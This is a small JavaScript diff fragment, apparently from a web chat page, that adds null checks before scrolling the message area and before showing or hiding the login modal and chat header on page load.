             const area = document.getElementById('chatMessagesArea');
-            setTimeout(() => { area.scrollTop = area.scrollHeight; }, 250);
+            setTimeout(() => { if(area) area.scrollTop = area.scrollHeight; }, 250);
         }
 
         function handleKeyPress(e) { if(e.key === 'Enter') sendChatMessage(); }
 
         window.onload = function() {
+            const loginModal = document.getElementById('loginModal');
+            const chatHead = document.getElementById('chatHead');
+
             if(!currentUser) { 
-                document.getElementById('loginModal').style.display = 'flex'; 
-                document.getElementById('chatHead').style.display = 'none';
+                if(loginModal) loginModal.style.display = 'flex'; 
+                if(chatHead) chatHead.style.display = 'none';
             } else { 
-                document.getElementById('loginModal').style.display = 'none'; 
+                if(loginModal) loginModal.style.display = 'none'; 
                 initAppSession(); 
             }
         }
